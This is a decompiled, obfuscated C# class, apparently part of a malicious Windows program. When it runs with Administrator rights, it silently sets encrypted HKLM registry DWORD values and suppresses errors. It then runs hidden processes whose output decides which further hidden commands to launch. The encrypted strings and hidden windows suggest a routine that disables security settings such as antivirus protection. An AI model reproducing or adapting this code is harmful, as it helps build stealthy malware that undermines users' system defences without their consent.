using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

public static class hFIatzlNsBWV
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void XZHZJVwfiRxVYgI()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ORzJOZGkhILq(getString_0(107373247), getString_0(107373698), getString_0(107395757));
			getString_0(107373641);
			ORzJOZGkhILq(getString_0(107372791), getString_0(107372730), getString_0(107395774));
			ORzJOZGkhILq(getString_0(107372705), getString_0(107373096), getString_0(107395774));
			getString_0(107373059);
			ORzJOZGkhILq(getString_0(107372705), getString_0(107372205), getString_0(107395774));
			getString_0(107372168);
			ORzJOZGkhILq(getString_0(107372705), getString_0(107372430), getString_0(107395774));
			getString_0(107371881);
			oyKRuEYRgBEo();
		}
	}

	private static void ORzJOZGkhILq(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void oyKRuEYRgBEo()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358949),
			Arguments = getString_0(107372083),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107372014)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107372000));
			}
			else if (text.StartsWith(getString_0(107373096)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107371931));
			}
			else if (text.StartsWith(getString_0(107371350)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107371317));
			}
			else if (text.StartsWith(getString_0(107371252)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107371223));
			}
			else if (text.StartsWith(getString_0(107371162)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107371649));
			}
			else if (text.StartsWith(getString_0(107371560)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107371499));
			}
			else if (text.StartsWith(getString_0(107371406)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107370861));
			}
			else if (text.StartsWith(getString_0(107370796)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107370783));
			}
			else if (text.StartsWith(getString_0(107370674)) && text.EndsWith(getString_0(107371977)))
			{
				oBJyxoPsWsfj(getString_0(107370677));
			}
			else if (text.StartsWith(getString_0(107371128)) && !text.EndsWith(getString_0(107396216)))
			{
				oBJyxoPsWsfj(getString_0(107371099));
			}
			else if (text.StartsWith(getString_0(107371042)) && !text.EndsWith(getString_0(107395757)))
			{
				oBJyxoPsWsfj(getString_0(107370989));
			}
			else if (text.StartsWith(getString_0(107370976)) && !text.EndsWith(getString_0(107370943)))
			{
				oBJyxoPsWsfj(getString_0(107370938));
			}
			else if (text.StartsWith(getString_0(107370357)) && !text.EndsWith(getString_0(107370943)))
			{
				oBJyxoPsWsfj(getString_0(107370288));
			}
			else if (text.StartsWith(getString_0(107370223)) && !text.EndsWith(getString_0(107370943)))
			{
				oBJyxoPsWsfj(getString_0(107370190));
			}
			else if (text.StartsWith(getString_0(107370165)) && !text.EndsWith(getString_0(107370943)))
			{
				oBJyxoPsWsfj(getString_0(107370608));
			}
		}
	}

	public static void oBJyxoPsWsfj(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358949),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static hFIatzlNsBWV()
	{
		Strings.CreateGetStringDelegate(typeof(hFIatzlNsBWV));
	}
}
